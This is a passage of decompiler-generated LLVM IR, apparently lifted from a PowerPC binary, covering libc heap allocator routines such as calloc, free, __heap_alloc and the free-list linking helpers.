  %v3_1000e46c = icmp eq i32 %v0_1000e46c, 0
  br i1 %v3_1000e46c, label %dec_label_pc_1000e474, label %dec_label_pc_1000e524.thread

dec_label_pc_1000e524.thread:                     ; preds = %dec_label_pc_1000e438
  br label %dec_label_pc_1000e538

dec_label_pc_1000e474:                            ; preds = %dec_label_pc_1000e438
  %v3_1000e478 = load i32, i32* @global_var_1002f074.241, align 4
  %v3_1000e47c = load i32, i32* %stack_var_-40, align 4
  %v2_1000e480 = icmp ult i32 %v3_1000e47c, %v3_1000e478
  br i1 %v2_1000e480, label %dec_label_pc_1000e498, label %dec_label_pc_1000e488

dec_label_pc_1000e488:                            ; preds = %dec_label_pc_1000e474
  %v2_1000e488 = add i32 %v3_1000e478, -1
  %v1_1000e490 = add i32 %v2_1000e488, %v3_1000e47c
  br label %dec_label_pc_1000e498

dec_label_pc_1000e498:                            ; preds = %dec_label_pc_1000e474, %dec_label_pc_1000e488
  %storemerge = phi i32 [ %v1_1000e490, %dec_label_pc_1000e488 ], [ %v3_1000e47c, %dec_label_pc_1000e474 ]
  store i32 %storemerge, i32* @r9, align 4
  store i32 268493992, i32* @lr, align 4
  %v1_1000e4a4 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10033b68.205 to i32))
  %v0_1000e4a8 = load i32, i32* @r31, align 4
  store i32 268494000, i32* @lr, align 4
  %v1_1000e4ac = call i32 @__GI_sbrk(i32 %v0_1000e4a8)
  %v3_1000e4b0 = icmp eq i32 %v1_1000e4ac, -1
  br i1 %v3_1000e4b0, label %dec_label_pc_1000e4d0, label %dec_label_pc_1000e4b8

dec_label_pc_1000e4b8:                            ; preds = %dec_label_pc_1000e498
  %v1_1000e4b8 = add i32 %v1_1000e4ac, 3
  %v1_1000e4bc = call i32 @__asm_rlwinm(i32 %v1_1000e4b8, i32 0, i32 0, i32 29)
  store i32 %v1_1000e4bc, i32* @r30, align 4
  %v4_1000e4c0 = icmp eq i32 %v1_1000e4bc, %v1_1000e4ac
  br i1 %v4_1000e4c0, label %dec_label_pc_1000e4d0, label %dec_label_pc_1000e4c8

dec_label_pc_1000e4c8:                            ; preds = %dec_label_pc_1000e4b8
  %v2_1000e4c8 = sub i32 %v1_1000e4bc, %v1_1000e4ac
  store i32 268494032, i32* @lr, align 4
  %v1_1000e4cc = call i32 @__GI_sbrk(i32 %v2_1000e4c8)
  br label %dec_label_pc_1000e4d0

dec_label_pc_1000e4d0:                            ; preds = %dec_label_pc_1000e4b8, %dec_label_pc_1000e498, %dec_label_pc_1000e4c8
  store i32 ptrtoint (i32* @global_var_10033b68.205 to i32), i32* @r3, align 4
  store i32 268494044, i32* @lr, align 4
  %v0_1000e4d8 = call i32 @pthread_mutex_unlock()
  %v0_1000e4dc = load i32, i32* @r30, align 4
  %v3_1000e4dc = icmp eq i32 %v0_1000e4dc, -1
  br i1 %v3_1000e4dc, label %dec_label_pc_1000e540, label %dec_label_pc_1000e524

dec_label_pc_1000e524:                            ; preds = %dec_label_pc_1000e4d0
  store i32 ptrtoint (i32* @global_var_1003383c.206 to i32), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_1002efa0 to i32), i32* @r29, align 4
  store i32 268494076, i32* @lr, align 4
  %v1_1000e4f8 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1003383c.206 to i32))
  %v0_1000e4fc = load i32, i32* @r31, align 4
  %v0_1000e500 = load i32, i32* @r30, align 4
  %v0_1000e504 = load i32, i32* @r29, align 4
  store i32 268494092, i32* @lr, align 4
  %v3_1000e508 = inttoptr i32 %v0_1000e504 to i32*
  %v4_1000e508 = call i32 @__heap_free(i32* %v3_1000e508, i32 %v0_1000e500, i32 %v0_1000e4fc)
  %v0_1000e50c = load i32, i32* @r29, align 4
  %v2_1000e514 = inttoptr i32 %v0_1000e50c to i32*
  %v3_1000e514 = call i32 @__heap_alloc(i32* %v2_1000e514, i32 %v2_1000e454)
  store i32 %v3_1000e514, i32* @r31, align 4
  %v0_1000e51c = load i32, i32* @r28, align 4
  store i32 %v0_1000e51c, i32* @r3, align 4
  store i32 268494116, i32* @lr, align 4
  %v0_1000e520 = call i32 @pthread_mutex_unlock()
  %v0_1000e524.pre = load i32, i32* @r31, align 4
  %v3_1000e524 = icmp eq i32 %v0_1000e524.pre, 0
  br i1 %v3_1000e524, label %dec_label_pc_1000e538.thread, label %dec_label_pc_1000e538

dec_label_pc_1000e538.thread:                     ; preds = %dec_label_pc_1000e524
  br label %dec_label_pc_1000e540

dec_label_pc_1000e538:                            ; preds = %dec_label_pc_1000e524, %dec_label_pc_1000e524.thread
  %v0_1000e538.pr6 = phi i32 [ %v0_1000e46c, %dec_label_pc_1000e524.thread ], [ %v0_1000e524.pre, %dec_label_pc_1000e524 ]
  %v3_1000e52c = load i32, i32* %stack_var_-40, align 4
  %v2_1000e530 = inttoptr i32 %v0_1000e538.pr6 to i32*
  store i32 %v3_1000e52c, i32* %v2_1000e530, align 4
  %v0_1000e534 = load i32, i32* @r31, align 4
  %v1_1000e534 = add i32 %v0_1000e534, 4
  store i32 %v1_1000e534, i32* @r31, align 4
  %v3_1000e538 = icmp eq i32 %v1_1000e534, 0
  br i1 %v3_1000e538, label %dec_label_pc_1000e540, label %dec_label_pc_1000e550

dec_label_pc_1000e540:                            ; preds = %dec_label_pc_1000e538.thread, %dec_label_pc_1000e538, %dec_label_pc_1000e4d0, %dec_label_pc_1000e42c
  %v0_1000e540 = call i32 @__errno_location()
  %v2_1000e548 = inttoptr i32 %v0_1000e540 to i32*
  store i32 12, i32* %v2_1000e548, align 4
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_1000e550

dec_label_pc_1000e550:                            ; preds = %dec_label_pc_1000e538, %dec_label_pc_1000e540
  %v0_1000e554 = phi i32 [ %v1_1000e534, %dec_label_pc_1000e538 ], [ 0, %dec_label_pc_1000e540 ]
  ret i32 %v0_1000e554

; uselistorder directives
  uselistorder i32 %v1_1000e534, { 1, 0, 2 }
  uselistorder i32 %v0_1000e524.pre, { 1, 0 }
  uselistorder i32 %v1_1000e4bc, { 1, 0, 2 }
  uselistorder i32 %v1_1000e4ac, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-40, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1000e550, { 1, 0 }
  uselistorder label %dec_label_pc_1000e540, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000e4d0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e498, { 1, 0 }
  uselistorder label %dec_label_pc_1000e42c, { 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_1000e568 = icmp eq i32 %arg1, 0
  %v2_1000e578 = mul i32 %arg2, %arg1
  store i32 %v2_1000e578, i32* @r31, align 4
  br i1 %v3_1000e568, label %dec_label_pc_1000e5a4, label %dec_label_pc_1000e584

dec_label_pc_1000e584:                            ; preds = %entry
  %v2_1000e584 = udiv i32 %v2_1000e578, %arg1
  store i32 0, i32* @r30, align 4
  %v4_1000e58c = icmp eq i32 %v2_1000e584, %arg2
  br i1 %v4_1000e58c, label %dec_label_pc_1000e5a4, label %dec_label_pc_1000e594

dec_label_pc_1000e594:                            ; preds = %dec_label_pc_1000e584
  %v0_1000e594 = call i32 @__errno_location()
  %v2_1000e59c = inttoptr i32 %v0_1000e594 to i32*
  store i32 12, i32* %v2_1000e59c, align 4
  br label %dec_label_pc_1000e5c0

dec_label_pc_1000e5a4:                            ; preds = %dec_label_pc_1000e584, %entry
  store i32 %v2_1000e578, i32* @r3, align 4
  store i32 268494252, i32* @lr, align 4
  %v0_1000e5a8 = call i32 @malloc()
  %v0_1000e5ac = load i32, i32* @r31, align 4
  store i32 %v0_1000e5a8, i32* @r30, align 4
  %v3_1000e5b0 = icmp eq i32 %v0_1000e5a8, 0
  br i1 %v3_1000e5b0, label %dec_label_pc_1000e5c0, label %dec_label_pc_1000e5bc

dec_label_pc_1000e5bc:                            ; preds = %dec_label_pc_1000e5a4
  store i32 268494272, i32* @lr, align 4
  %v3_1000e5bc = call i32 @__GI_memset(i32 0, i32 %v0_1000e5ac, i32 %v0_1000e5ac)
  br label %dec_label_pc_1000e5c0

dec_label_pc_1000e5c0:                            ; preds = %dec_label_pc_1000e5a4, %dec_label_pc_1000e594, %dec_label_pc_1000e5bc
  %v0_1000e5c4 = load i32, i32* @r30, align 4
  ret i32 %v0_1000e5c4

; uselistorder directives
  uselistorder i32 %v0_1000e5ac, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000e5c0, { 2, 0, 1 }
}

define i32 @free() local_unnamed_addr {
entry:
  %v0_1000e5d8 = load i32, i32* @r3, align 4
  %v3_1000e5d8 = icmp eq i32 %v0_1000e5d8, 0
  br i1 %v3_1000e5d8, label %dec_label_pc_1000e6c4, label %dec_label_pc_1000e5f0

dec_label_pc_1000e5f0:                            ; preds = %entry
  %v1_1000e5f4 = add i32 %v0_1000e5d8, -4
  %v2_1000e5f4 = inttoptr i32 %v1_1000e5f4 to i32*
  %v3_1000e5f4 = load i32, i32* %v2_1000e5f4, align 4
  store i32 %v3_1000e5f4, i32* @r28, align 4
  store i32 %v1_1000e5f4, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r26, align 4
  store i32 268494348, i32* @lr, align 4
  %v1_1000e608 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1003383c.206 to i32))
  %v0_1000e60c = load i32, i32* @r29, align 4
  %v0_1000e610 = load i32, i32* @r28, align 4
  store i32 268494364, i32* @lr, align 4
  %v4_1000e618 = call i32 @__heap_free(i32* nonnull @global_var_1002efa0, i32 %v0_1000e60c, i32 %v0_1000e610)
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r9, align 4
  %v3_1000e620 = load i32, i32* @global_var_1002f074.241, align 4
  store i32 %v4_1000e618, i32* @r29, align 4
  %v1_1000e628 = inttoptr i32 %v4_1000e618 to i32*
  %v2_1000e628 = load i32, i32* %v1_1000e628, align 4
  store i32 %v2_1000e628, i32* @r27, align 4
  %v1_1000e62c = mul i32 %v3_1000e620, 8
  %v2_1000e630 = icmp ult i32 %v2_1000e628, %v1_1000e62c
  br i1 %v2_1000e630, label %dec_label_pc_1000e664, label %dec_label_pc_1000e638

dec_label_pc_1000e638:                            ; preds = %dec_label_pc_1000e5f0
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r9, align 4
  store i32 ptrtoint (i32* @global_var_10033b68.205 to i32), i32* @r28, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000e64c.436 to i32), i32* @lr, align 4
  %v1_1000e648 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10033b68.205 to i32))
  store i32 268494420, i32* @lr, align 4
  %v1_1000e650 = call i32 @__GI_sbrk(i32 0)
  %v0_1000e654 = load i32, i32* @r31, align 4
  %v4_1000e654 = icmp eq i32 %v0_1000e654, %v1_1000e650
  br i1 %v4_1000e654, label %dec_label_pc_1000e66c, label %dec_label_pc_1000e65c

dec_label_pc_1000e65c:                            ; preds = %dec_label_pc_1000e638
  %v0_1000e65c = load i32, i32* @r28, align 4
  store i32 %v0_1000e65c, i32* @r3, align 4
  store i32 268494436, i32* @lr, align 4
  %v0_1000e660 = call i32 @pthread_mutex_unlock()
  br label %dec_label_pc_1000e664

dec_label_pc_1000e664:                            ; preds = %dec_label_pc_1000e5f0, %dec_label_pc_1000e65c
  %v0_1000e664 = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000e6c0

dec_label_pc_1000e66c:                            ; preds = %dec_label_pc_1000e638
  %v0_1000e66c = load i32, i32* @r29, align 4
  %v1_1000e66c = add i32 %v0_1000e66c, 4
  %v2_1000e66c = inttoptr i32 %v1_1000e66c to i32*
  %v3_1000e66c = load i32, i32* %v2_1000e66c, align 4
  %v3_1000e670 = icmp eq i32 %v3_1000e66c, 0
  br i1 %v3_1000e670, label %dec_label_pc_1000e680, label %dec_label_pc_1000e678

dec_label_pc_1000e678:                            ; preds = %dec_label_pc_1000e66c
  %v1_1000e678 = add i32 %v0_1000e66c, 8
  %v2_1000e678 = inttoptr i32 %v1_1000e678 to i32*
  %v3_1000e678 = load i32, i32* %v2_1000e678, align 4
  %v2_1000e67c = add i32 %v3_1000e66c, 8
  %v3_1000e67c = inttoptr i32 %v2_1000e67c to i32*
  store i32 %v3_1000e678, i32* %v3_1000e67c, align 4
  %v0_1000e680.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000e680

dec_label_pc_1000e680:                            ; preds = %dec_label_pc_1000e66c, %dec_label_pc_1000e678
  %v0_1000e680 = phi i32 [ %v0_1000e66c, %dec_label_pc_1000e66c ], [ %v0_1000e680.pre, %dec_label_pc_1000e678 ]
  %v1_1000e680 = add i32 %v0_1000e680, 8
  %v2_1000e680 = inttoptr i32 %v1_1000e680 to i32*
  %v3_1000e680 = load i32, i32* %v2_1000e680, align 4
  store i32 %v3_1000e680, i32* @r9, align 4
  %v1_1000e684 = add i32 %v0_1000e680, 4
  %v2_1000e684 = inttoptr i32 %v1_1000e684 to i32*
  %v3_1000e684 = load i32, i32* %v2_1000e684, align 4
  %v3_1000e688 = icmp eq i32 %v3_1000e680, 0
  br i1 %v3_1000e688, label %dec_label_pc_1000e698, label %dec_label_pc_1000e690

dec_label_pc_1000e690:                            ; preds = %dec_label_pc_1000e680
  %v2_1000e690 = add i32 %v3_1000e680, 4
  %v3_1000e690 = inttoptr i32 %v2_1000e690 to i32*
  store i32 %v3_1000e684, i32* %v3_1000e690, align 4
  br label %dec_label_pc_1000e69c

dec_label_pc_1000e698:                            ; preds = %dec_label_pc_1000e680
  store i32 %v3_1000e684, i32* @global_var_1002efa0, align 4
  br label %dec_label_pc_1000e69c

dec_label_pc_1000e69c:                            ; preds = %dec_label_pc_1000e690, %dec_label_pc_1000e698
  store i32 ptrtoint (i32* @global_var_1003383c.206 to i32), i32* @r3, align 4
  store i32 268494504, i32* @lr, align 4
  %v0_1000e6a4 = call i32 @pthread_mutex_unlock()
  %v0_1000e6a8 = load i32, i32* @r27, align 4
  %v1_1000e6a8 = load i32, i32* @r29, align 4
  %v0_1000e6b0 = load i32, i32* @r31, align 4
  %v2_1000e6a8 = sub i32 12, %v0_1000e6a8
  %v1_1000e6ac = add i32 %v2_1000e6a8, %v1_1000e6a8
  %v2_1000e6b0 = sub i32 %v1_1000e6ac, %v0_1000e6b0
  store i32 268494520, i32* @lr, align 4
  %v1_1000e6b4 = call i32 @__GI_sbrk(i32 %v2_1000e6b0)
  br label %dec_label_pc_1000e6c0

dec_label_pc_1000e6c0:                            ; preds = %dec_label_pc_1000e664, %dec_label_pc_1000e69c
  %storemerge = phi i32 [ %v0_1000e664, %dec_label_pc_1000e664 ], [ ptrtoint (i32* @global_var_10033b68.205 to i32), %dec_label_pc_1000e69c ]
  store i32 %storemerge, i32* @r3, align 4
  store i32 268494532, i32* @lr, align 4
  %v0_1000e6c0 = call i32 @pthread_mutex_unlock()
  br label %dec_label_pc_1000e6c4

dec_label_pc_1000e6c4:                            ; preds = %entry, %dec_label_pc_1000e6c0
  %.0 = phi i32 [ undef, %entry ], [ %v0_1000e6c0, %dec_label_pc_1000e6c0 ]
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v0_1000e680, { 1, 0 }
  uselistorder i32 undef, { 3, 5, 4, 2, 0, 1, 6, 7, 8, 9 }
  uselistorder i32 (i32)* @__GI_sbrk, { 1, 0, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_10033b68.205 to i32), { 0, 1, 4, 5, 2, 3, 6 }
  uselistorder label %dec_label_pc_1000e6c4, { 1, 0 }
  uselistorder label %dec_label_pc_1000e6c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000e69c, { 1, 0 }
  uselistorder label %dec_label_pc_1000e680, { 1, 0 }
  uselistorder label %dec_label_pc_1000e664, { 1, 0 }
}

define i32 @__heap_alloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1000e6d8 = inttoptr i32 %arg2 to i32*
  %v2_1000e6d8 = load i32, i32* %v1_1000e6d8, align 4
  %v1_1000e6dc = add i32 %v2_1000e6d8, 3
  %v1_1000e6e0 = call i32 @__asm_rlwinm(i32 %v1_1000e6dc, i32 0, i32 0, i32 29)
  %v2_1000e6e4 = icmp ugt i32 %v1_1000e6e0, 11
  br i1 %v2_1000e6e4, label %dec_label_pc_1000e768.preheader, label %dec_label_pc_1000e6ec

dec_label_pc_1000e6ec:                            ; preds = %entry
  br label %dec_label_pc_1000e768.preheader

dec_label_pc_1000e768.preheader:                  ; preds = %entry, %dec_label_pc_1000e6ec
  %storemerge20 = phi i32 [ 12, %dec_label_pc_1000e6ec ], [ %v1_1000e6e0, %entry ]
  %v0_1000e74c = phi i32 [ 12, %dec_label_pc_1000e6ec ], [ %v1_1000e6e0, %entry ]
  store i32 %storemerge20, i32* @r11, align 4
  %storemerge2 = load i32, i32* %arg1, align 4
  store i32 %storemerge2, i32* @r9, align 4
  %v3_1000e7685 = icmp eq i32 %storemerge2, 0
  br i1 %v3_1000e7685, label %dec_label_pc_1000e770, label %dec_label_pc_1000e6f8

dec_label_pc_1000e6f8:                            ; preds = %dec_label_pc_1000e768.preheader, %dec_label_pc_1000e764
  %v0_1000e764 = phi i32 [ %storemerge, %dec_label_pc_1000e764 ], [ %storemerge2, %dec_label_pc_1000e768.preheader ]
  %v1_1000e6f8 = inttoptr i32 %v0_1000e764 to i32*
  %v2_1000e6f8 = load i32, i32* %v1_1000e6f8, align 4
  store i32 %v2_1000e6f8, i32* @r10, align 4
  %v2_1000e6fc = icmp ult i32 %v2_1000e6f8, %v0_1000e74c
  br i1 %v2_1000e6fc, label %dec_label_pc_1000e764, label %dec_label_pc_1000e704

dec_label_pc_1000e704:                            ; preds = %dec_label_pc_1000e6f8
  %v1_1000e704 = add i32 %v0_1000e74c, 44
  %v2_1000e708 = icmp ult i32 %v2_1000e6f8, %v1_1000e704
  br i1 %v2_1000e708, label %dec_label_pc_1000e710, label %dec_label_pc_1000e74c

dec_label_pc_1000e710:                            ; preds = %dec_label_pc_1000e704
  %v1_1000e710 = add i32 %v0_1000e764, 4
  %v2_1000e710 = inttoptr i32 %v1_1000e710 to i32*
  %v3_1000e710 = load i32, i32* %v2_1000e710, align 4
  %v3_1000e714 = icmp eq i32 %v3_1000e710, 0
  br i1 %v3_1000e714, label %dec_label_pc_1000e724, label %dec_label_pc_1000e71c

dec_label_pc_1000e71c:                            ; preds = %dec_label_pc_1000e710
  %v1_1000e71c = add i32 %v0_1000e764, 8
  %v2_1000e71c = inttoptr i32 %v1_1000e71c to i32*
  %v3_1000e71c = load i32, i32* %v2_1000e71c, align 4
  %v2_1000e720 = add i32 %v3_1000e710, 8
  %v3_1000e720 = inttoptr i32 %v2_1000e720 to i32*
  store i32 %v3_1000e71c, i32* %v3_1000e720, align 4
  %v0_1000e724.pre = load i32, i32* @r9, align 4
  %v0_1000e740.pre = load i32, i32* @r10, align 4
  br label %dec_label_pc_1000e724

dec_label_pc_1000e724:                            ; preds = %dec_label_pc_1000e710, %dec_label_pc_1000e71c
  %v0_1000e740 = phi i32 [ %v2_1000e6f8, %dec_label_pc_1000e710 ], [ %v0_1000e740.pre, %dec_label_pc_1000e71c ]
  %v0_1000e724 = phi i32 [ %v0_1000e764, %dec_label_pc_1000e710 ], [ %v0_1000e724.pre, %dec_label_pc_1000e71c ]
  %v1_1000e724 = add i32 %v0_1000e724, 8
  %v2_1000e724 = inttoptr i32 %v1_1000e724 to i32*
  %v3_1000e724 = load i32, i32* %v2_1000e724, align 4
  store i32 %v3_1000e724, i32* @r8, align 4
  %v1_1000e728 = add i32 %v0_1000e724, 4
  %v2_1000e728 = inttoptr i32 %v1_1000e728 to i32*
  %v3_1000e728 = load i32, i32* %v2_1000e728, align 4
  %v3_1000e72c = icmp eq i32 %v3_1000e724, 0
  store i32 %v0_1000e740, i32* @r11, align 4
  br i1 %v3_1000e72c, label %dec_label_pc_1000e740, label %dec_label_pc_1000e734

dec_label_pc_1000e734:                            ; preds = %dec_label_pc_1000e724
  %v2_1000e738 = add i32 %v3_1000e724, 4
  %v3_1000e738 = inttoptr i32 %v2_1000e738 to i32*
  store i32 %v3_1000e728, i32* %v3_1000e738, align 4
  br label %dec_label_pc_1000e754

dec_label_pc_1000e740:                            ; preds = %dec_label_pc_1000e724
  store i32 %v3_1000e728, i32* %arg1, align 4
  br label %dec_label_pc_1000e754

dec_label_pc_1000e74c:                            ; preds = %dec_label_pc_1000e704
  %v2_1000e74c = sub i32 %v2_1000e6f8, %v0_1000e74c
  store i32 %v2_1000e74c, i32* %v1_1000e6f8, align 4
  br label %dec_label_pc_1000e754

dec_label_pc_1000e754:                            ; preds = %dec_label_pc_1000e740, %dec_label_pc_1000e734, %dec_label_pc_1000e74c
  %v0_1000e754 = load i32, i32* @r10, align 4
  %v1_1000e754 = load i32, i32* @r9, align 4
  %v2_1000e754 = sub i32 %v1_1000e754, %v0_1000e754
  store i32 %v2_1000e754, i32* @r9, align 4
  %v0_1000e758 = load i32, i32* @r11, align 4
  store i32 %v0_1000e758, i32* %v1_1000e6d8, align 4
  %v0_1000e75c = load i32, i32* @r9, align 4
  %v1_1000e75c = add i32 %v0_1000e75c, 12
  ret i32 %v1_1000e75c

dec_label_pc_1000e764:                            ; preds = %dec_label_pc_1000e6f8
  %v1_1000e764 = add i32 %v0_1000e764, 4
  %storemerge.in = inttoptr i32 %v1_1000e764 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* @r9, align 4
  %v3_1000e768 = icmp eq i32 %storemerge, 0
  br i1 %v3_1000e768, label %dec_label_pc_1000e768.dec_label_pc_1000e770_crit_edge, label %dec_label_pc_1000e6f8

dec_label_pc_1000e768.dec_label_pc_1000e770_crit_edge: ; preds = %dec_label_pc_1000e764
  br label %dec_label_pc_1000e770

dec_label_pc_1000e770:                            ; preds = %dec_label_pc_1000e768.dec_label_pc_1000e770_crit_edge, %dec_label_pc_1000e768.preheader
  ret i32 0

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_1000e724, { 1, 0 }
  uselistorder i32 %v2_1000e6f8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_1000e764, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_1000e74c, { 1, 2, 0 }
  uselistorder i32* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1000e754, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e724, { 1, 0 }
  uselistorder label %dec_label_pc_1000e6f8, { 1, 0 }
  uselistorder label %dec_label_pc_1000e768.preheader, { 1, 0 }
}

define i32 @__heap_link_free_area(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1000e778 = icmp eq i32 %arg3, 0
  %v2_1000e77c = add i32 %arg2, 4
  %v3_1000e77c = inttoptr i32 %v2_1000e77c to i32*
  store i32 %arg4, i32* %v3_1000e77c, align 4
  %v2_1000e780 = add i32 %arg2, 8
  %v3_1000e780 = inttoptr i32 %v2_1000e780 to i32*
  store i32 %arg3, i32* %v3_1000e780, align 4
  br i1 %v3_1000e778, label %dec_label_pc_1000e790, label %dec_label_pc_1000e788

dec_label_pc_1000e788:                            ; preds = %entry
  %v2_1000e788 = add i32 %arg3, 4
  %v3_1000e788 = inttoptr i32 %v2_1000e788 to i32*
  store i32 %arg2, i32* %v3_1000e788, align 4
  br label %dec_label_pc_1000e794

dec_label_pc_1000e790:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_1000e794

dec_label_pc_1000e794:                            ; preds = %dec_label_pc_1000e788, %dec_label_pc_1000e790
  %v3_1000e794 = icmp eq i32 %arg4, 0
  %v0_1000e798 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000e794, i32 %v0_1000e798)
  %v2_1000e79c = add i32 %arg4, 8
  %v3_1000e79c = inttoptr i32 %v2_1000e79c to i32*
  store i32 %arg2, i32* %v3_1000e79c, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg4, { 0, 2, 1 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1, 4, 3 }
  uselistorder label %dec_label_pc_1000e794, { 1, 0 }
}

define i32 @__heap_link_free_area_after(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1000e7a4 = icmp eq i32 %arg3, 0
  br i1 %v3_1000e7a4, label %dec_label_pc_1000e7b4, label %dec_label_pc_1000e7ac

dec_label_pc_1000e7ac:                            ; preds = %entry
  %v2_1000e7ac = add i32 %arg3, 4
  %v3_1000e7ac = inttoptr i32 %v2_1000e7ac to i32*
  store i32 %arg2, i32* %v3_1000e7ac, align 4
  br label %dec_label_pc_1000e7b8

dec_label_pc_1000e7b4:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_1000e7b8

dec_label_pc_1000e7b8:                            ; preds = %dec_label_pc_1000e7ac, %dec_label_pc_1000e7b4
  %v2_1000e7b8 = add i32 %arg2, 8
  %v3_1000e7b8 = inttoptr i32 %v2_1000e7b8 to i32*
  store i32 %arg3, i32* %v3_1000e7b8, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e7b8, { 1, 0 }
}

define i32 @__heap_free(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* @r10, align 4
  store i32 0, i32* @r11, align 4
  %v2_1000e7d8 = load i32, i32* %arg1, align 4
  store i32 %v2_1000e7d8, i32* @r31, align 4
  %v2_1000e7dc = add i32 %arg3, %arg2
  store i32 %v2_1000e7dc, i32* %r3.global-to-local, align 4
  %v3_1000e7f07 = icmp eq i32 %v2_1000e7d8, 0
  %v1_1000e7f48 = add i32 %v2_1000e7d8, 12
  %tmp69 = icmp uge i32 %v1_1000e7f48, %arg2
  %or.cond10 = or i1 %v3_1000e7f07, %tmp69
  br i1 %or.cond10, label %dec_label_pc_1000e800, label %dec_label_pc_1000e7e8

dec_label_pc_1000e7e8:                            ; preds = %entry, %dec_label_pc_1000e7e8
  %v0_1000e84811 = phi i32 [ %v3_1000e7ec, %dec_label_pc_1000e7e8 ], [ %v2_1000e7d8, %entry ]
  store i32 %v0_1000e84811, i32* @r11, align 4
  %v1_1000e7ec = add i32 %v0_1000e84811, 4
  %v2_1000e7ec = inttoptr i32 %v1_1000e7ec to i32*
  %v3_1000e7ec = load i32, i32* %v2_1000e7ec, align 4
  store i32 %v3_1000e7ec, i32* @r31, align 4
  %v3_1000e7f0 = icmp eq i32 %v3_1000e7ec, 0
  %v1_1000e7f4 = add i32 %v3_1000e7ec, 12
  %tmp6 = icmp uge i32 %v1_1000e7f4, %arg2
  %or.cond = or i1 %v3_1000e7f0, %tmp6
  br i1 %or.cond, label %dec_label_pc_1000e800, label %dec_label_pc_1000e7e8

dec_label_pc_1000e800:                            ; preds = %dec_label_pc_1000e7e8, %entry
  %v0_1000e83c.lcssa = phi i32 [ 0, %entry ], [ %v0_1000e84811, %dec_label_pc_1000e7e8 ]
  %v0_1000e848.lcssa = phi i32 [ %v2_1000e7d8, %entry ], [ %v3_1000e7ec, %dec_label_pc_1000e7e8 ]
  %v3_1000e7f0.lcssa = phi i1 [ %v3_1000e7f07, %entry ], [ %v3_1000e7f0, %dec_label_pc_1000e7e8 ]
  br i1 %v3_1000e7f0.lcssa, label %dec_label_pc_1000e8b8, label %dec_label_pc_1000e808

dec_label_pc_1000e808:                            ; preds = %dec_label_pc_1000e800
  %v1_1000e808 = inttoptr i32 %v0_1000e848.lcssa to i32*
  %v2_1000e808 = load i32, i32* %v1_1000e808, align 4
  %v2_1000e80c = sub i32 %v0_1000e848.lcssa, %v2_1000e808
  %v1_1000e810 = add i32 %v2_1000e80c, 12
  store i32 %v1_1000e810, i32* @r9, align 4
  %v3_1000e814 = icmp ugt i32 %v1_1000e810, %v2_1000e7dc
  br i1 %v3_1000e814, label %dec_label_pc_1000e8b8, label %dec_label_pc_1000e81c

dec_label_pc_1000e81c:                            ; preds = %dec_label_pc_1000e808
  %v4_1000e814 = icmp eq i32 %v1_1000e810, %v2_1000e7dc
  %v2_1000e820 = add i32 %v2_1000e808, %arg3
  store i32 %v2_1000e820, i32* @r29, align 4
  br i1 %v4_1000e814, label %dec_label_pc_1000e828, label %dec_label_pc_1000e858

dec_label_pc_1000e828:                            ; preds = %dec_label_pc_1000e81c
  %v3_1000e828 = icmp eq i32 %v0_1000e83c.lcssa, 0
  br i1 %v3_1000e828, label %dec_label_pc_1000e8ac, label %dec_label_pc_1000e830

dec_label_pc_1000e830:                            ; preds = %dec_label_pc_1000e828
  %v1_1000e830 = add i32 %v0_1000e83c.lcssa, 12
  %v4_1000e834 = icmp eq i32 %v1_1000e830, %arg2
  br i1 %v4_1000e834, label %dec_label_pc_1000e83c, label %dec_label_pc_1000e8ac

dec_label_pc_1000e83c:                            ; preds = %dec_label_pc_1000e830
  %v1_1000e83c = inttoptr i32 %v0_1000e83c.lcssa to i32*
